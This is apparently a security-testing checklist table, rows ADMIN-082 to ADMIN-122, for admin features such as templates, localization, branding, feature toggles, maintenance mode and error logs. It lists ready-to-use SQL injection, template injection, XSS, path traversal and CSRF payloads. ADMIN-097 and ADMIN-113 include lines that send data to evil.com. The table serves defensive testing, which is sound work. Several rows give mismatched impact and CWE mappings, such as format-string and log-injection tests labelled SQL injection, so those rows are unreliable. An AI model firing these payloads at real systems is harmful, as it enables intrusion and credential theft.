| ADMIN-082 | Email Template SQL Injection | Injection (WSTG-INPV-05) | Email Templates | 1. If template variables are populated from database queries test for SQL injection in variable mappings.<br>2. Inject SQL in template parameter bindings.<br>3. Check for data leakage in emails. | Application must use parameterized queries for all template variable resolution and database interactions. | <code>template_variable={{user.name' OR 1=1--}};dynamic_field=SELECT password FROM users;query_param=' UNION SELECT email FROM admin--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-083 | SSTI in Notification Template | Injection (WSTG-INPV-18) | Notification Templates | 1. Edit notification templates for push and in-app and SMS notifications.<br>2. Inject SSTI payloads.<br>3. Trigger notifications.<br>4. Check if template engine evaluates injected expressions. | Application must sandbox notification template editing and prevent SSTI that could lead to code execution. | <code>notification_body={{7&#42;7}};push_content=${T(java.lang.Runtime).getRuntime().exec('id')};sms_template=&lt;%= &#96;whoami&#96; %&gt;</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ADMIN-084 | Unauthorized Notification Template Access | Broken Access Control (WSTG-AUTHZ-02) | Notification Templates | 1. Attempt to view and edit notification templates as non-admin.<br>2. Access template management API endpoints.<br>3. Test with different role levels.<br>4. Check for role-based template access. | Application must restrict notification template management to authorized admin roles only. | <code>GET /api/admin/notification-templates;PUT /api/admin/notification-templates/NT-1001 with non-admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-085 | XSS in Notification Template Content | Cross-Site Scripting (WSTG-INPV-02) | Notification Templates | 1. Edit notification template with XSS payload.<br>2. Trigger the notification for other users.<br>3. Check if XSS executes in in-app notification rendering.<br>4. Test across different notification channels. | Application must sanitize notification template content and encode output when rendering notifications in any client context. | <code>notification_template=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;push_body=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-086 | Notification Template Variable Injection | Injection (WSTG-INPV-01) | Notification Templates | 1. If notification templates use variable substitution test for injection in variable names.<br>2. Inject template syntax in variable values.<br>3. Test for variable scope escape. | Application must validate template variables against a whitelist and prevent variable injection or scope escape in notification templates. | <code>variable_name={{constructor.constructor('return process')()}};template_var=${__import__('os').system('id')}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-087 | Notification Template IDOR | Broken Access Control (WSTG-AUTHZ-04) | Notification Templates | 1. Access own notification templates.<br>2. Change template_id to access another tenant's templates.<br>3. Enumerate template IDs.<br>4. Check for cross-tenant template data leakage. | Application must enforce tenant isolation on notification templates and prevent cross-tenant access. | <code>GET /api/admin/notification-templates/NT-2001 with TENANT-1001 credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-088 | XSS via Localization Strings | Cross-Site Scripting (WSTG-INPV-02) | Localization Settings | 1. Modify localization strings to include XSS payloads.<br>2. Change language to use the modified strings.<br>3. Navigate through the application.<br>4. Check if XSS executes from translation strings. | Application must sanitize all localization strings and encode output when rendering translated text in the application. | <code>translation_key_value=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;welcome_message=&lt;img src=x onerror=alert(1)&gt;;button_text=&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-089 | Unauthorized Localization Modification | Broken Access Control (WSTG-AUTHZ-02) | Localization Settings | 1. Attempt to modify localization settings as non-admin.<br>2. Access translation management API.<br>3. Modify default language or add translations.<br>4. Check role-based access enforcement. | Application must restrict localization settings modification to authorized admin roles only. | <code>PUT /api/admin/localization/translations with non-admin token;POST /api/admin/localization/languages/add with regular user</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-090 | Localization SQL Injection | Injection (WSTG-INPV-05) | Localization Settings | 1. Search or filter localization strings.<br>2. Inject SQL payloads in search and language and key parameters.<br>3. Observe for SQL errors or data leakage. | Application must use parameterized queries for all localization database operations. | <code>GET /api/admin/localization?key=' OR 1=1--;GET /api/admin/translations?lang=en' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-091 | Localization File Path Traversal | Path Traversal (WSTG-INPV-10) | Localization Settings | 1. If localization loads language files from file system modify the language parameter.<br>2. Attempt directory traversal to read arbitrary files.<br>3. Test with encoded traversal sequences. | Application must validate language file paths and restrict to authorized localization file directories only. | <code>GET /api/localization?lang=../../../etc/passwd;lang=....//....//etc/shadow;lang=%2e%2e%2f%2e%2e%2f</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ADMIN-092 | Right-to-Left Override Attack via Localization | Input Validation (WSTG-INPV-01) | Localization Settings | 1. Add localization strings containing RTL override characters.<br>2. Include Unicode bidirectional control characters.<br>3. Check for visual spoofing in rendered text.<br>4. Test for filename or URL obfuscation. | Application must strip or neutralize Unicode bidirectional control characters in localization strings to prevent visual spoofing. | <code>Insert U+202E (RTL Override) in translation strings to reverse displayed text;create visually misleading translations</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADMIN-093 | Localization String Format String Vulnerability | Injection (WSTG-INPV-01) | Localization Settings | 1. If localization uses format strings inject format specifiers.<br>2. Test with %s and %x and %n format specifiers.<br>3. Check for information disclosure or crashes from format string processing. | Application must safely handle localization string formatting and prevent format string injection. | <code>translation_value=%s%s%s%s%s;message=%x%x%x%x;template=%n%n;greeting=Hello %s {user_controlled}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-094 | XSS via Custom Branding Content | Cross-Site Scripting (WSTG-INPV-02) | Branding / White-labeling | 1. Modify branding elements like logo alt text and company name and footer text and custom CSS.<br>2. Include XSS payloads.<br>3. Navigate the application.<br>4. Check if XSS executes from branding elements. | Application must sanitize all branding content and encode output when rendering custom branding elements. | <code>company_name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;footer_html=&lt;img src=x onerror=alert(1)&gt;;custom_css=body{background:url(javascript:alert(1))}</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-095 | Branding Logo Upload Malicious File | File Upload (WSTG-INPV-12) | Branding / White-labeling | 1. Upload a custom logo via branding settings.<br>2. Upload web shell disguised as image.<br>3. Upload SVG with embedded JavaScript.<br>4. Upload oversized files.<br>5. Check content type validation. | Application must validate branding file uploads by content inspection and strip active content from SVGs and restrict file types. | <code>Upload shell.php.png;logo.svg with &lt;script&gt;alert(1)&lt;/script&gt;;polyglot image with PHP code;10GB image file</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Files | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| ADMIN-096 | Unauthorized Branding Modification | Broken Access Control (WSTG-AUTHZ-02) | Branding / White-labeling | 1. Attempt to modify branding settings as non-admin.<br>2. Access branding API endpoints.<br>3. Change company logo and colors and domain settings.<br>4. Check role-based access enforcement. | Application must restrict branding modifications to authorized admin roles and log all branding changes. | <code>PUT /api/admin/branding with non-admin token;POST /api/admin/branding/logo with regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-097 | Custom CSS Injection | Cross-Site Scripting (WSTG-INPV-02) | Branding / White-labeling | 1. If white-labeling supports custom CSS inject malicious CSS.<br>2. Include CSS expressions and url() with JavaScript.<br>3. Test for CSS-based data exfiltration.<br>4. Check for behavior property injection. | Application must sanitize custom CSS and restrict to safe CSS properties preventing any CSS-based attack vectors. | <code>custom_css=&#42;{background:url('javascript:alert(1)')};css=input[value^="a"]{background:url(https://evil.com/?a)};css=body{-moz-binding:url(evil.xml)}</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-098 | Branding SSRF via Custom Logo URL | SSRF (WSTG-INPV-19) | Branding / White-labeling | 1. If branding allows specifying a logo URL instead of uploading set URL to internal service.<br>2. Trigger logo rendering.<br>3. Check if server fetches the internal resource. | Application must validate branding resource URLs against allowlists and prevent server-side fetching of internal resources. | <code>logo_url=http://169.254.169.254/latest/meta-data/;favicon_url=http://localhost:8080/admin;banner=http://10.0.0.1/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADMIN-099 | Branding Domain Takeover | Security Misconfiguration (WSTG-CONF-01) | Branding / White-labeling | 1. If white-labeling supports custom domains check for dangling DNS records.<br>2. Test for subdomain takeover on custom branded domains.<br>3. Verify SSL certificate coverage. | Custom branded domains must have proper DNS configuration with no dangling CNAME records that could enable domain takeover. | <code>Check custom branded domains for CNAME to unclaimed services;verify SSL certificate matches custom domain</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | subfinder;subjack;dig;SSL Checker | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-100 | IDOR on Branding Configuration | Broken Access Control (WSTG-AUTHZ-04) | Branding / White-labeling | 1. Access own organization's branding configuration.<br>2. Change tenant_id to access another organization's branding.<br>3. Modify another tenant's branding settings. | Application must enforce tenant isolation on branding configurations and prevent cross-tenant branding access or modification. | <code>GET /api/admin/branding?tenant_id=TENANT-2001;PUT /api/admin/branding/BRAND-2001 with TENANT-1001 credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-101 | Unauthorized Feature Toggle Manipulation | Broken Access Control (WSTG-AUTHZ-02) | Feature Toggles | 1. As a non-admin attempt to access feature toggle management.<br>2. Enable disabled premium features.<br>3. Disable security features via toggles.<br>4. Check for role-based access enforcement. | Application must restrict feature toggle management to authorized admin roles and prevent unauthorized feature activation or deactivation. | <code>PUT /api/admin/features/premium-feature with enabled=true using non-admin token;disable security_feature</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-102 | Feature Toggle Bypass via Direct API Access | Broken Access Control (WSTG-AUTHZ-02) | Feature Toggles | 1. Identify features controlled by toggles.<br>2. Access the feature's API endpoint directly while the feature is disabled.<br>3. Check if backend enforcement exists independent of toggle UI.<br>4. Test with direct URL access. | Application must enforce feature toggles at the API level and not just the UI level preventing direct API access to disabled features. | <code>Access POST /api/disabled-feature directly when feature toggle shows disabled;bypass UI-level feature gate via API</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-103 | Feature Toggle Race Condition | Business Logic (WSTG-BUSL-08) | Feature Toggles | 1. Rapidly toggle a feature on and off.<br>2. Send concurrent feature access requests during toggle transition.<br>3. Check for inconsistent feature state.<br>4. Verify atomic toggle changes. | Application must implement atomic feature toggle changes with proper locking to prevent inconsistent feature states during transitions. | <code>Send concurrent PUT /api/admin/features/toggle and GET /api/features/status during toggle transition</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADMIN-104 | Feature Toggle Information Disclosure | Information Disclosure (WSTG-INFO-05) | Feature Toggles | 1. Access feature toggle listing.<br>2. Check if disabled features reveal upcoming features or internal plans.<br>3. Verify if feature descriptions expose sensitive information.<br>4. Check for feature flag names exposing business logic. | Feature toggle listings must not reveal sensitive business plans or upcoming features to unauthorized users. | <code>GET /api/admin/features check for upcoming_acquisition_integration;secret_partner_feature;internal_project_x</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-105 | CSRF on Feature Toggle Change | CSRF (WSTG-SESS-05) | Feature Toggles | 1. Craft a malicious page that disables critical security features via toggles.<br>2. Lure admin to visit.<br>3. Check if feature toggle changes require CSRF token and confirmation. | Application must validate CSRF tokens on all feature toggle operations and require confirmation for security-critical toggle changes. | <code>&lt;script&gt;fetch('/api/admin/features/2fa-enforcement',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"enabled":false}'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-106 | Feature Toggle SQL Injection | Injection (WSTG-INPV-05) | Feature Toggles | 1. Search or filter feature toggles.<br>2. Inject SQL payloads in feature name or status filter.<br>3. Observe for SQL errors or data leakage. | Application must use parameterized queries for all feature toggle database operations. | <code>GET /api/admin/features?name=' OR 1=1--;GET /api/admin/features?status=enabled' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-107 | Feature Toggle Environment Mismatch | Security Misconfiguration (WSTG-CONF-01) | Feature Toggles | 1. Check if development or staging feature toggles are active in production.<br>2. Verify environment-specific toggle configurations.<br>3. Test for debug features enabled in production. | Feature toggles must be properly configured per environment with no development or debugging features active in production. | <code>Check for debug_mode=true;verbose_logging=true;test_payment_gateway=true;skip_authentication=true in production feature flags</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Manual Review | CWE-16; OWASP Security Misconfiguration (A05) |
| ADMIN-108 | Maintenance Mode Authentication Bypass | Authentication (WSTG-ATHN-01) | Maintenance Mode | 1. Enable maintenance mode.<br>2. Check if all endpoints are properly restricted.<br>3. Test for API endpoints still accessible during maintenance.<br>4. Check if admin access is properly maintained.<br>5. Test for bypass via headers. | Application must consistently restrict all user-facing functionality during maintenance mode while maintaining secure admin access for management. | <code>Access /api/users;/api/data;/api/sensitive during maintenance mode;test with X-Maintenance-Bypass: true header</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-109 | Unauthorized Maintenance Mode Toggle | Broken Access Control (WSTG-AUTHZ-02) | Maintenance Mode | 1. As a non-admin attempt to enable or disable maintenance mode.<br>2. Access maintenance mode API endpoint.<br>3. Check if maintenance mode can be weaponized for DoS.<br>4. Verify role restrictions. | Application must restrict maintenance mode control to super-admin roles and require re-authentication for maintenance mode changes. | <code>PUT /api/admin/maintenance with enabled=true using non-admin token;POST /api/admin/maintenance/toggle with regular credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-110 | CSRF on Maintenance Mode Activation | CSRF (WSTG-SESS-05) | Maintenance Mode | 1. Craft a malicious page that enables maintenance mode.<br>2. Lure super-admin to visit.<br>3. Check if maintenance mode activates causing service disruption for all users. | Application must validate CSRF tokens and require re-authentication for maintenance mode activation. | <code>&lt;script&gt;fetch('/api/admin/maintenance',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"enabled":true,message:"Site is down"}'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-111 | Maintenance Mode Bypass via Cached Content | Caching (WSTG-ATHN-06) | Maintenance Mode | 1. Access application pages and cache them.<br>2. Enable maintenance mode.<br>3. Check if cached content is still served.<br>4. Test CDN caching during maintenance.<br>5. Verify cache purging. | Application must purge all caches when maintenance mode is activated and serve maintenance page from origin without caching. | <code>Access pages before maintenance;enable maintenance;check if CDN serves cached content;verify cache headers</code> | Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser;CDN Management | CWE-524; [Web Cache kit](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception |
| ADMIN-112 | Maintenance Mode Information Disclosure | Information Disclosure (WSTG-INFO-05) | Maintenance Mode | 1. Access the maintenance page.<br>2. Check for information disclosure about system status or scheduled maintenance details.<br>3. Inspect maintenance page source for internal information. | Maintenance mode pages must not reveal system internals and expected downtime details or infrastructure information to end users. | <code>Check maintenance page for server_version;expected_downtime;deployment_details;infrastructure_info;debug_data</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-113 | Maintenance Mode XSS via Custom Message | Cross-Site Scripting (WSTG-INPV-02) | Maintenance Mode | 1. Set a custom maintenance mode message.<br>2. Include XSS payload in the message.<br>3. View the maintenance page.<br>4. Check if XSS executes for all users seeing the maintenance page. | Application must sanitize the maintenance mode message and encode output when rendering it on the maintenance page. | <code>maintenance_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;custom_html=&lt;img src=x onerror=fetch('https://evil.com/'+document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-114 | Selective Maintenance Mode Bypass for API | Business Logic (WSTG-BUSL-02) | Maintenance Mode | 1. Enable maintenance mode.<br>2. Check if API endpoints are accessible while web interface is in maintenance.<br>3. Test for inconsistent maintenance enforcement across channels.<br>4. Verify mobile app behavior. | Application must enforce maintenance mode consistently across all access channels including web and API and mobile and WebSocket. | <code>Access /api/v1/data during maintenance;check WebSocket connectivity;test mobile API endpoints;verify consistency</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-115 | Unauthorized Error Log Access | Broken Access Control (WSTG-AUTHZ-02) | Error Logs / Debugging | 1. Access error log viewing endpoints as non-admin.<br>2. Check common error log URLs.<br>3. Test for directory listing of log directories.<br>4. Access logging administration endpoints. | Application must restrict error log access to authorized admin roles and store logs in non-web-accessible locations. | <code>GET /api/admin/error-logs;GET /logs/;GET /var/log/app/;GET /error-log;GET /debug/logs with non-admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-116 | Sensitive Data in Error Logs | Information Disclosure (WSTG-ERRH-01) | Error Logs / Debugging | 1. Access error logs.<br>2. Search for passwords and API keys and session tokens and personal data.<br>3. Check if stack traces contain sensitive configuration.<br>4. Verify PII masking in logs. | Error logs must not contain plaintext passwords or tokens or API keys and must mask PII and sanitize stack traces. | <code>Search logs for password=;api_key=;session=;token=;credit_card=;ssn=;check stack traces for config details</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Manual Review;Grep;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-117 | Error Log Injection | Injection (WSTG-INPV-15) | Error Logs / Debugging | 1. Trigger application errors with crafted input containing log injection payloads.<br>2. Include CRLF characters to forge log entries.<br>3. Inject ANSI escape codes.<br>4. Test for log forging. | Application must sanitize all data written to error logs to prevent log injection and forging attacks. | <code>input=test%0d%0a[CRITICAL] System compromised%0d%0a;param=value%0aFake admin login success;inject ANSI escape sequences</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-118 | Debug Mode Enabled in Production | Security Misconfiguration (WSTG-CONF-01) | Error Logs / Debugging | 1. Check if debug mode is enabled.<br>2. Trigger errors and check for verbose stack traces.<br>3. Check for debug toolbars and profilers.<br>4. Test for debug-only endpoints.<br>5. Check framework debug settings. | All debug features must be disabled in production with no verbose error messages or debug toolbars or profiler access available. | <code>Trigger 500 error and check for stack trace;access /debug;/_debug;/phpinfo;/elmah.axd;check Django DEBUG=True;Rails development mode</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Nuclei;DirBuster | CWE-16; OWASP Security Misconfiguration (A05) |
| ADMIN-119 | Error Log Path Traversal | Path Traversal (WSTG-INPV-10) | Error Logs / Debugging | 1. Access error log download endpoint.<br>2. Modify the file path parameter.<br>3. Attempt to read arbitrary files via the log viewer.<br>4. Test with encoded traversal sequences. | Application must validate log file paths and restrict access to authorized log directories only. | <code>GET /api/admin/logs/download?file=../../../etc/passwd;file=....//....//etc/shadow;logfile=%2e%2e%2f</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ADMIN-120 | Error Log XSS in Log Viewer | Cross-Site Scripting (WSTG-INPV-02) | Error Logs / Debugging | 1. Trigger application errors with XSS payloads in input that gets logged.<br>2. View error logs in the admin panel log viewer.<br>3. Check if stored XSS executes when admin reviews logs. | Application must encode all error log data when rendering in the admin log viewer to prevent stored XSS attacks on administrators. | <code>Trigger error with input=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;view in admin log viewer;check for XSS in stack trace display</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-121 | Error Log SQL Injection in Search | Injection (WSTG-INPV-05) | Error Logs / Debugging | 1. Search error logs by various criteria.<br>2. Inject SQL payloads in search parameters.<br>3. Test date range and error type and source filters.<br>4. Observe for SQL errors. | Application must use parameterized queries for all error log search and filtering operations. | <code>GET /api/admin/error-logs?search=' OR 1=1--;GET /api/admin/logs?level=error' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-122 | Error Log Denial of Service | Business Logic (WSTG-BUSL-05) | Error Logs / Debugging | 1. Generate massive volume of errors rapidly.<br>2. Check if log storage capacity is monitored.<br>3. Test if excessive logging affects application performance.<br>4. Verify log rotation and disk space management. | Error logging must handle high volumes without affecting application performance with proper rotation and disk space monitoring. | <code>Trigger 100000+ errors per minute by sending malformed requests;check for log-based DoS;verify disk space monitoring</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
